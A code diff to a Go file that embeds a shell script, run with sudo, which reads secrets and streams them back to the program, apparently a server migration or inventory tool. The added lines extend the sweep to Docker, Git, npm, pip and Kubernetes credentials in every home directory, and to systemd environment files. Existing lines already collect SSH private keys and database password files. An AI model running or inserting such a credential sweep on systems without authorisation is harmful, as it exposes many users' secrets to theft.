@@ -76,7 +76,8 @@ type credFile struct {
 // to scan for app configs) and {FILES} (exact extra files — cron scripts and
 // -i key paths) are baked in as base64, since the script runs through
 // `base64 -d | sudo sh` and outer-shell env wouldn't survive. BRIDGE_ROOT
-// prefixes every path (tests). POSIX sh + stat/head/base64 only, no awk.
+// prefixes every path (tests). POSIX sh + stat/head/base64/tr, plus sed for the
+// systemd EnvironmentFile step only (absent → that step is skipped), no awk.
 const credScriptTmpl = `R="${BRIDGE_ROOT:-}"
 echo @@CSBEGIN
 TOTAL=0; N=0
@@ -123,8 +124,16 @@ emitjar() {
     printf '@@E %s %s\n' 0 0
   done
 }
-for g in "$R"/etc/mysql/debian.cnf "$R"/root/.my.cnf "$R"/etc/my.cnf.d/*.cnf "$R"/var/log/mysqld.log "$R"/etc/postfix/sasl_passwd "$R"/etc/webmin/virtual-server/domains/* "$R"/etc/tnsnames.ora "$R"/var/opt/oracle/tnsnames.ora "$R"/u01/app/oracle/product/*/network/admin/tnsnames.ora "$R"/u01/app/oracle/product/*/*/network/admin/tnsnames.ora "$R"/etc/webmin/mysql/config "$R"/etc/webmin/postgresql/config "$R"/etc/psa/.psa.shadow "$R"/root/.pgpass "$R"/var/lib/postgresql/.pgpass "$R"/var/lib/pgsql/.pgpass "$R"/etc/redis/redis.conf "$R"/etc/redis.conf "$R"/etc/redis/users.acl ; do emit "$g"; done
+for g in "$R"/etc/mysql/debian.cnf "$R"/root/.my.cnf "$R"/etc/my.cnf.d/*.cnf "$R"/var/log/mysqld.log "$R"/etc/postfix/sasl_passwd "$R"/etc/webmin/virtual-server/domains/* "$R"/etc/tnsnames.ora "$R"/var/opt/oracle/tnsnames.ora "$R"/u01/app/oracle/product/*/network/admin/tnsnames.ora "$R"/u01/app/oracle/product/*/*/network/admin/tnsnames.ora "$R"/etc/webmin/mysql/config "$R"/etc/webmin/postgresql/config "$R"/etc/psa/.psa.shadow "$R"/root/.pgpass "$R"/var/lib/postgresql/.pgpass "$R"/var/lib/pgsql/.pgpass "$R"/etc/redis/redis.conf "$R"/etc/redis.conf "$R"/etc/redis/users.acl "$R"/etc/pip.conf "$R"/etc/kubernetes/admin.conf ; do emit "$g"; done
 for k in "$R"/root/.ssh/id_* ; do case "$k" in *.pub) ;; *) emit "$k" ;; esac; done
+# User-level credential stores, home-relative — resolved for root, every /home
+# user and www-data (/var/www). shortcut: homes under /root /home /var/www cover
+# the common docroot owners; a deploy user homed elsewhere is missed — upgrade to
+# getent if that matters.
+for h in "$R"/root "$R"/home/* "$R"/var/www ; do
+  [ -d "$h" ] || continue
+  for rel in .netrc .docker/config.json .git-credentials .npmrc .composer/auth.json .m2/settings.xml .pip/pip.conf .config/pip/pip.conf .kube/config ; do emit "$h/$rel"; done
+done
 OLDIFS=$IFS; IFS='
 '
 for x in $(printf %s {FILES} | base64 -d 2>/dev/null); do [ -n "$x" ] && emit "$R$x"; done
@@ -135,14 +144,28 @@ for j in $(printf %s {JARS} | base64 -d 2>/dev/null); do [ -n "$j" ] && emitjar 
 # a "$VAR" of space-separated names would not word-split. emit skips missing.
 for r in $(printf %s {ROOTS} | base64 -d 2>/dev/null); do
   [ -n "$r" ] || continue
-  for b in "$r" "$r/.." ; do for rel in .env wp-config.php application/config/database.php application/config/email.php app/Config/Database.php configuration.php config.php conexao.ini db.php conexao.php conn.php ; do emit "$R$b/$rel"; done; done
-  for d in "$R$r"/*/ ; do [ -d "$d" ] || continue; dd="${d#$R}"; for rel in .env wp-config.php application/config/database.php application/config/email.php app/Config/Database.php configuration.php config.php conexao.ini db.php conexao.php conn.php ; do emit "$R$dd$rel"; done; done
+  for b in "$r" "$r/.." ; do for rel in .env .npmrc auth.json wp-config.php application/config/database.php application/config/email.php app/Config/Database.php configuration.php config.php conexao.ini db.php conexao.php conn.php ; do emit "$R$b/$rel"; done; done
+  for d in "$R$r"/*/ ; do [ -d "$d" ] || continue; dd="${d#$R}"; for rel in .env .npmrc auth.json wp-config.php application/config/database.php application/config/email.php app/Config/Database.php configuration.php config.php conexao.ini db.php conexao.php conn.php ; do emit "$R$dd$rel"; done; done
   # Drupal multisite settings and ScriptCase _lib connection files (bounded globs; globs ignore IFS).
   for s in "$R$r"/sites/*/settings.php "$R$r"/*/sites/*/settings.php "$R$r"/_lib/*/conexao.ini ; do emit "$s"; done
   erel "$R$r"
   for d in "$R$r"/*/ ; do [ -d "$d" ] || continue; erel "${d%/}"; done
 done
 IFS=$OLDIFS
+# systemd EnvironmentFile: a unit's EnvironmentFile= names a file holding
+# DB_*/_PASSWORD/_TOKEN env secrets. Stream each referencing unit (so Go can
+# find the reference and route) and the files it names. Only units that
+# reference one are streamed; sed is optional (its absence just skips this).
+for u in "$R"/etc/systemd/system/*.service "$R"/lib/systemd/system/*.service "$R"/usr/lib/systemd/system/*.service ; do
+  [ -f "$u" ] && [ -r "$u" ] || continue
+  refs=$(sed -n 's/^[[:space:]]*EnvironmentFile[[:space:]]*=[[:space:]]*-\{0,1\}\([^[:space:]]*\).*/\1/p' "$u" 2>/dev/null)
+  [ -n "$refs" ] || continue
+  emit "$u"
+  OIFS=$IFS; IFS='
+'
+  for ef in $refs; do case "$ef" in /*) emit "$R$ef" ;; esac ; done
+  IFS=$OIFS
+done
 echo @@CSEND
 `
 
